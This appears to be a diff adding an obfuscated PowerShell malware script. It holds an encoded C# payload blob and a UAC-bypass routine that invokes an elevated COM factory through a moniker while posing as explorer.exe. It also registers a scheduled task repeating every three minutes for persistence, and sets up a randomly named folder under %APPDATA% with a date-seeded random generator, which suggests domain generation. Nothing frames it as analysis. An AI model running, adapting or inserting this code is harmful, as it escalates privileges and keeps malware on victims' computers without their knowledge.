l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8^d@^b1bg85qs0fd38a6q8bj6ib6bg838a&11^b11c4&11bg8pok&11bg86q83nn6q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae4(%b!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cq8q5qs^d@kd&pnmnhfnae@(jb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8^d@^b1bg85qs0fd38a6q8jmc!ig0fd0fd&115et^b1&11nhftir^d@&11bg86q83nn6q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae@(jb!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cq8q5qs^d@kd&pnmnhfnae3f4b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8^d@^b1bg85qs0fd38a6q8jmc!ig0fd0fd&115et^b1&11nhfq8q!igdaaib65qs0fd6q83nn6q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae3f4b!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cq8q5qs^d@kd&pnmnhfnae29kb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8!g^5qs0fd^b16q8o3s5qs38afi0&11^d@^b1!fd&11bg8^d@5qs!ig0fd6q83nn6q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae29kb!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q8q*9tds6fftds6ff6q86q86q8tds6fftds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qsb!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q8pkt(k05a#tds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q825jb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q85a#k!2^b1&117(c3oq6q8%h(&11^d@&11bg8pok&11nhf^!7iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q85a#k!2^b1&116q85a#&115qs0fd38aq8q&117*l!g^38a38a&11nhfiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8^!7b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q85a#k!2^b1&117(c3oq6q8%h(&11^d@&11bg8pok&11nhf25jiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q825jb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg87(c3oq6q8%h(&11^d@&11bg8pok&11nhffd4iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8apdnhfbg8iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8pktbg8!ig5et&11^d@^d@pktib6bg8ib6daa&11^b1&11bg8^d@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8fd4b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg87(c3oq6q8%h(&11^d@&11bg8pok&11nhfc1@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8qht^b1e0rbj6fi0!g^0fd(&51c4apd5qs^d@^b1pkt^b1bg8iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8%h(&11^d@&11bg8pok&11nhf57liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8!g^e0r!ig0fd38a6q8%h(&11^d@&11bg8pok&11nhf@(jiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8%h(&11^d@&11bg8pok&11nhf3f4iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8!g^e0r!ig0fd38a6q8%h(&11^d@&11bg8pok&11nhf29kiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8!g^e0r!ig0fd38a6q8qht^b1e0rbj6fi0!g^0fd(&51c4apd5qs^d@^b1pkt^b1bg8fd425jiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8c1@57lb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg87(c3oq6q8%h(&11^d@&11bg8pok&11nhf#hjiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8#hj@(jb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q85a#k!2^b1&117(c3oq6q8%h(&11^d@&11bg8pok&11nhf^!74(%iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8pkt!ig^d@^b1pktbg8!ig5et&11^d@^d@pnm0fd5qs^b1%h(!ig!g^^b15qs0fd&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8^!725j29kb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q85a#k!2^b1&117(c3oq6q8%h(&11^d@&11bg8pok&11nhf^!7^!7iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8^!7b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg87(c3oq6q8%h(&11^d@&11bg8pok&11nhf^!725jiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8!g^e0r!ig0fd38a6q81c4&11^d@^d@5qs!ig0fdpnmnhfiq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6fftds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8tir0fd5qs5et!ignhf&11b!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q8tir*g7pnmjmc#@0q8q(k0s(l1c4bj6%h(pnm*g7ai7tds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8!g^^d@fi0!igbg8^b16q8apd&110fd38a^b1fi0iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8!g^^d@fi0!igbg8^b16q8a2qib6c0m5qsdaa!g^daaapd&110fd38a^b1fi0iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q85a#!g^#mk#mk&11bg8iq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qsb!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q8%h(bj6apds(ltir1c4(k0%h(s(lpkt%h(#@0jmc(k01c41c4s(lpktqht%h(qhta2q(k0bj6(k0%h(1c4tds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8^!7@(jb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q85a#k!2^b1&117(c3oq6q8%h(&11^d@&11bg8pok&11nhf^!7iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#k!2!fdib6e0rqhtbg8bg8ib6k!2&7k6q81c45qs&n(&11jmc!ig0fd^d@^b16q8js#6q8^!74(%b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg87(c3oq6q8%h(&11^d@&11bg8pok&11nhf25jiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tir*g7pnmjmc#@0q8q(k0s(l1c4bj6%h(pnm*g7ai76q8pnmdaaib638a&11pktib6^b1fi0*g7ib6daa&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tir*g7pnmjmc#@0q8q(k0s(l1c4bj6%h(pnm*g7ai76q8jmc!igdaadaaib60fdnhfapd5qs0fd&11iq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6fftds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qsb!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cctds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8d#ee0r5qs0fd(&5iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q85a#e0r5qs0fd(&5iq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qsb!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q8pkt(k05a#s(lapdq8q%h(s(lq8qqhtbj6qhttds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q8apd&110fd38a^b1fi0iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q8pnm0fd5qs^b15qsib6e0r5qs&n(&11nhfiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1@(jc1@6q81c4^d@o3sib60fdnhfe0r&11pnm0fd^b1pkt^b1bg8iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cc6q8pnm0fdapd!igib6nhf#@0bg8nhf&11bg8a2q!ignhf!g^e0r&11apd5qs^d@^b1iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cc6q8pnm0fda2q&11daa!igbg8k!2#@0bg8nhf&11bg8a2q!ignhf!g^e0r&11apd5qs^d@^b1iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cc6q8pnm0fdpnm0fd5qs^b15qsib6e0r5qs&n(ib6^b15qs!ig0fd#@0bg8nhf&11bg8a2q!ignhf!g^e0r&11apd5qs^d@^b1iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8(k00fd^b1bg8k!2pnm0fdpktbg8!ig38abg8&11^d@^d@iq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qsb!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q8apdq8q%h(s(lq8qqhtbj6qhts(lbj6qht5a#apd(k0s(l(k0*g7bj6%h(7cctds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cc6q8pnm0fdapd!igib6nhf#@0bg8nhf&11bg8apd5qs0fd(&5^d@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cc6q8pnm0fda2q&11daa!igbg8k!2#@0bg8nhf&11bg8apd5qs0fd(&5^d@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8apdpnm1c4bj6s(l(k0*g7bj6%h(7cc6q8pnm0fdpnm0fd5qs^b15qsib6e0r5qs&n(ib6^b15qs!ig0fd#@0bg8nhf&11bg8apd5qs0fd(&5^d@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8q8qe0re0r5a#ib6^d@&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8(k00fd^b1bg8k!2pkt!ig5qs0fd^b1iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q81c45qs&n(&11#@0#mkpnmdaaib638a&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tir*g7pnmjmc#@0q8q(k0s(l1c4bj6%h(pnm*g7ai76q8d#e!g^e0re0rq8qe0re0r*g7ib6daa&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tir*g7pnmjmc#@0q8q(k0s(l1c4bj6%h(pnm*g7ai76q85a#ib6^d@&11q8qe0re0r*g7ib6daa&11iq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6fftds6ff6q86q86q86q86q86q86q86q87(c1c4^b1bg8!g^5et^b1apdib6k!2!ig!g^^b1naeapdib6k!2!ig!g^^b1k5(5qs0fdnhf@&81c4&11@46!g^&110fd^b15qsib6e0r&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qsb!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1bg8!g^5et^b16q85a#pnm*g7q8qs(l#@0pktbj61c4fd4tds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q85et7*l1c4^b1bg8!g^5et^b1iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q838abg8#mkd#ee0rib638a^d@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q838abg8#mka2q!ignhf&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q8nhfs!0bj65qs5et(&5jmc!ig!g^0fd^b1q8q&11ib6nhfe0r5qs0fd&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q8nhfs!0bj6bg8ib65et(&5d#ee0rib638a^d@iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q8nhfs!0jmce0rib6^d@^d@jmc!ig0fd^b1&11c0m^b1iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8tirpnm0fd^b1fd425j6q8e0r!ig5etib6e0r&11iq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8kd&1c4&11bg8pok&11bg8pnm0fd#mk!igiq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8pnm0fd^b1pkt^b1bg86q8fi0s!00fdnhfiq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6ff6q86q86q86q86q86q86q86q8tds6ff") -Language CSharp;
+function OveryPetateVorousLibernate {
+
+
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [string]
+        $TigablySolityPressFaming,
+            
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]
+        $ProodPeristRecess,
+            
+        [Parameter(Position = 2)]
+        [string]
+        $RestercedFaceousePrest
+            
+           
+    )
+
+    
+
+    CuloitePresteePolosureWardness  'C:\Windows\explorer.exe';
+			
+		
+    $OphicFleepMigleOction = New-Object "BIND_OPTS3";
+    $OphicFleepMigleOction.((lkjhgfdszxcvbnpoiuytredfgh "5et7*l1c4^b1bg8!g^5et^b1")) = [System.Runtime.InteropServices.Marshal]::SizeOf($OphicFleepMigleOction);
+    $OphicFleepMigleOction.((lkjhgfdszxcvbnpoiuytredfgh "nhfs!0jmce0rib6^d@^d@jmc!ig0fd^b1&11c0m^b1")) = 4;
+
+    $ChandadsEquiousAppenDominatsCorrorsed = [NativeMethods]::((lkjhgfdszxcvbnpoiuytredfgh "jmc!igai7&11^b1#@07*lshd&115et^b1"))((lkjhgfdszxcvbnpoiuytredfgh "(k0e0r&11pokib6^b15qs!ig0fd#ltqhtnhfdaa5qs0fd5qs^d@^b1bg8ib6^b1!igbg8q4h0fd&11s!0#lt3nnqht@(j5a#d#e(k0qhtc1@fd421c57l4(%^!7d#e21cc1@57l@(jd#e21cqht29kc1@57l21c#hj29kfd4q8qfd4qhtq8q3f45a#29kd#e4(%q*9"), [ref]$OphicFleepMigleOction, [Guid]::new((lkjhgfdszxcvbnpoiuytredfgh "3nn4(2be5b520-659f-4e67-8ddd-6812dabdd72d(2be5b520-659f-4e67-8ddd-6812dabdd72d(2be5b520-659f-4e67-8ddd-6812dabdd72d(2be5b520-659f-4e67-8ddd-6812dabdd72d(2be5b520-659f-4e67-8ddd-6812dabdd72d(2be5b520-659f-4e67-8ddd-6812dabdd72d(2be5b520-659f-4e67-8ddd-6812dabdd72d(%21c4(%4(%4(%4(%21c4(%4(%4(%4(%21cjmc4(%4(%4(%21c4(%4(%4(%4(%4(%4(%4(%4(%4(%4(%c1@@(jq*9")));
+
+
+
+    $TuborahamLabetalPariesUnble = [IElevatedFactoryServer].GetMethod((lkjhgfdszxcvbnpoiuytredfgh "1c4&11bg8pok&11bg8jmcbg8&11ib6^b1&11(k0e0r&11pokib6^b1&11nhf#@07*lshd&115et^b1"));
+    $RecorrousConfulsLitationCarboardHyparate = $TuborahamLabetalPariesUnble.Invoke($ChandadsEquiousAppenDominatsCorrorsed, @([Guid]::new((lkjhgfdszxcvbnpoiuytredfgh "3nn4(%#mk29k3f4fd4@(j#hj#mk21cib6c1@&1157l21cc1@5et#mk5et21c7*lnhffd4&1121c3f4fd4&11@(j^!757lc1@57l3f425jnhfnhfq*9")), [Guid]::new((lkjhgfdszxcvbnpoiuytredfgh "3nn4(%4(%4(%4(%4(%4(%4(%4(%21c4(%4(%4(%4(%21c4(%4(%4(%4(%21cjmc4(%4(%4(%21c4(%4(%4(%4(%4(%4(%4(%4(%4(%4(%c1@@(jq*9"))));
+
+   
+
+    $RecorrousConfulsLitationCarboardHyparate.((lkjhgfdszxcvbnpoiuytredfgh "jmc!ig0fd0fd&115et^b1"))();
+    $HomonsPhrassiveNonavice = $RecorrousConfulsLitationCarboardHyparate.((lkjhgfdszxcvbnpoiuytredfgh "ai7&11^b1d#e!ige0rnhf&11bg8"))((lkjhgfdszxcvbnpoiuytredfgh "!il"));
+    $EdienceBanceRefishWareteous = $TigablySolityPressFaming;
+    $EdienceBanceRefishWareteous;
+    $ImprizeMornalStodenSavioidaLacize = $ImprizeMornalStodenSavioidaLacize.replace((lkjhgfdszxcvbnpoiuytredfgh "!fdqht%h(s(lq8qqhtbj6(k0"), (Get-Date).ToString((lkjhgfdszxcvbnpoiuytredfgh "k!2k!2k!2k!221ca2qa2q21cnhfnhf")));
+    $ImprizeMornalStodenSavioidaLacize = $ImprizeMornalStodenSavioidaLacize.replace((lkjhgfdszxcvbnpoiuytredfgh "!fdqht%h(s(ljmca2qq8q"), $ProodPeristRecess);
+    $ImprizeMornalStodenSavioidaLacize = $ImprizeMornalStodenSavioidaLacize.replace((lkjhgfdszxcvbnpoiuytredfgh "!fdqht%h(s(lqht%h(ai7"), $RestercedFaceousePrest);
+    $ArgicalMulatedBloomethyShambail = $HomonsPhrassiveNonavice.((lkjhgfdszxcvbnpoiuytredfgh "%h(&1138a5qs^d@^b1&11bg8bj6ib6^d@(&5"))($EdienceBanceRefishWareteous, $ImprizeMornalStodenSavioidaLacize, 0, $null, $null, 3, $null);
+  
+}
+
+
+function CaposesUnfriggedGallowStoseCirmal {
+
+
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [string]
+        $TigablySolityPressFaming,
+            
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]
+        $ProodPeristRecess,
+            
+        [Parameter(Position = 2)]
+        [string]
+        $RestercedFaceousePrest
+            
+           
+    )
+		
+    write-output "USERMODE";
+    
+    $MyomoesEpistNairskiteHisings = New-ScheduledTaskAction -Execute $ProodPeristRecess -Argument $RestercedFaceousePrest;
+    $IndivideIndlessThokedGurageyAcical = New-ScheduledTaskTrigger -Once -At (Get-Date)  -RepetitionInterval (New-TimeSpan -Minutes 3);
+
+
+    
+    $CoyentConnoAgaraSniber = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries ;
+
+    
+    Register-ScheduledTask -Action $MyomoesEpistNairskiteHisings -Trigger $IndivideIndlessThokedGurageyAcical -TaskName $TigablySolityPressFaming -Settings $CoyentConnoAgaraSniber;
+		
+}
+
+
+
+write-host (lkjhgfdszxcvbnpoiuytredfgh "^d@^b1ib6bg8^b1");
+$MyogizedMulaticNotionici = ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 12  | % { [char]$_ }) )
+$DruffBraskefUnweedEuophylus = $env:appdata
+$FaaineSaffySpers = ((lkjhgfdszxcvbnpoiuytredfgh "3nn4(%q*9!il&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11bg8") -f $DruffBraskefUnweedEuophylus)
+mkdir $FaaineSaffySpers	
+$KitingOvedangneDialisesTside = (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@") + (lkjhgfdszxcvbnpoiuytredfgh "@&8&11c0m&11")
+
+$SemisbeNonlyAntlyMilizedTring = ((lkjhgfdszxcvbnpoiuytredfgh "3nn4(%q*9!il3nn^!7q*9") -f $FaaineSaffySpers, $MyogizedMulaticNotionici) + (lkjhgfdszxcvbnpoiuytredfgh "@&8&n(5qskd&")
+$FinessLigomeMarusesQuadsRaneller = New-Object ((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8%h(ib60fdnhf!igdaa"))([int]((((Get-Date).DayOfYear+3) / 7) +2024)*313797);
+$CurtlesTromatorySymphsBilingPellah = @();
